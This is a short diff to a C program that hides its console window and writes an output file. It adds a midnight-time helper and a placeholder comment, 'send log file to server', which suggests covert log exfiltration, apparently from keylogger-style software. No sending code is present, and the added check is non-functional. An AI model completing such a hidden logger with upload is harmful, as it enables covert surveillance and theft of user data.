@@ -133,6 +133,16 @@ void visibility() {
     #endif
 }
 
+time_t get_midnight_time() {
+    time_t now = time(NULL);
+    struct tm *local_tm = localtime(&now);
+
+    local_tm->tm_hour = 0;
+    local_tm->tm_min = 0;
+    local_tm->tm_sec = 0;
+
+    return mktime(local_tm);
+}
 int main() {
     //hide or show console window
     visibility();   
@@ -152,6 +162,12 @@ int main() {
 
 	//close file
     fclose(outputtext);
-    
+ 
+    time_t midnight_time = get_midnight_time();
+
+    if(time(NULL)==midnight_time){
+        //send log file to server 
+         time_t midnight_time = get_midnight_time();
+    }
     return 0;
 }
